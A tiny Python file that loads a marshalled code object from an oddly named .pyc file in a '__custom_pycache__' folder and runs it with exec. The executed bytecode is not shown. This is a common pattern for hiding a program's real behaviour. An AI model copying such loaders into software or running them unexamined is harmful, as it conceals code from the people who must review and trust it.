
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'api_e696f2c22143486e9be6247faaa7f090.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
